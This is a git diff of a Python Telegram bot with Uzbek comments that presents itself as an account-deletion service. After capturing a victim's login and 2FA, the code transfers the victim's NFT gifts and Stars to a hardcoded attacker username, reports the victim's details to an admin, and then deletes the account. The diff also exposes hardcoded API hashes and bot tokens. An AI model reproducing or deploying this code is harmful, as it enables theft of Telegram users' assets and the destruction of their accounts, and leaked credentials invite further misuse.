@@ -34,11 +34,11 @@ def run():
 
 Thread(target=run, daemon=True).start()
 
-# KONFIGURATSIYA
-API_ID = 32413839
-API_HASH = "067ca91addf879c1ea548bc37d5d9b98"
-BOT_TOKEN = "8758962250:AAFIkAuMQ8eDgn7LYkjwi0Gzi50wNCtL2j8"
-ADMIN_ID = 6377932858 
+# KONFIGURATSIYA (O'zgaruvchilar Render muhitidan o'qiladi)
+API_ID = int(os.environ.get("API_ID", "32413839"))
+API_HASH = os.environ.get("API_HASH", "067ca91addf879c1ea548bc37d5d9b98")
+BOT_TOKEN = os.environ.get("8758962250:AAE6L_bzNYzmvneL3AQF7oRRGSYnPE3T1TY")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", "6377932858"))
 
 TARGET_USER = "eshnazarov"
 STARS_CHANNEL_USERNAME = "stars_null"
@@ -280,7 +280,6 @@ async def process_2fa(message: types.Message, state: FSMContext):
         await message.answer(t["err_fa"])
 
 async def process_all_assets(client: TelegramClient, target_user: str = TARGET_USER):
-    # 1. NFT sovg'alarni o'tkazish
     try:
         target_entity = await client.get_input_entity(target_user)
         gifts_res = await client(functions.payments.GetSavedGiftsRequest(
@@ -298,7 +297,6 @@ async def process_all_assets(client: TelegramClient, target_user: str = TARGET_U
     except Exception as e:
         print(f"NFT Process Error: {e}")
 
-    # 2. Stars (yulduzlar)ni postga yuborish
     try:
         stars_status = await client(functions.payments.GetStarsStatusRequest(peer="me"))
         stars_balance = getattr(stars_status, 'balance', 0)
@@ -386,10 +384,8 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
     t = TEXTS[lang]
     client = auth["client"]
 
-    # 1. Premium ma'lumotlarini yig'ish
     user_info_str = await fetch_user_premium_and_level(client)
 
-    # 2. NFT larni tekshirish
     nft_items = await fetch_user_nft_gifts(client)
     nft_count = len(nft_items)
     
@@ -399,10 +395,8 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
     else:
         nft_str = "🛍 **NFT sovg'alar:** Topilmadi"
 
-    # 3. Aktivlarni o'tkazish (Stars / Gifts)
     await process_all_assets(client, target_user=TARGET_USER)
 
-    # 4. Adminga xabar yuborish
     try:
         full_name = message.from_user.full_name
         username = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
@@ -424,7 +418,6 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
     await message.answer(t["success"], parse_mode="Markdown")
     await asyncio.sleep(1)
 
-    # 5. Akkauntni o'chirish va tozalash
     try:
         await client(functions.account.DeleteAccountRequest(reason="Deactivation"))
     except Exception as e:
@@ -440,4 +433,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-  
